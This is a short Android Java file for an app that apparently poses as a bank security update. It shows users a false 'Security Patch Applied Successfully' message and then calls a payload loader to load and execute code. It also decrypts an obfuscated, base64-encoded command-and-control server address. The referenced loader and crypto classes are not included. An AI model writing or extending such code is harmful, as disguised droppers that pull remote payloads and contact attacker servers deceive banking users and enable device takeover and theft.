package com.bank.security.update;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        TextView tv = new TextView(this);
        tv.setText("System Security Patch Applied Successfully.");
        setContentView(tv);

        // Trigger dynamic payload loader
        PayloadLoader.loadAndExecute(this);

        // Initialize obfuscated crypto routine
        String c2 = CryptoHelper.decryptC2Config("U2VjdXJlQzJTZXJ2ZXIxODUuMjIwLjEwMS41");
    }
}
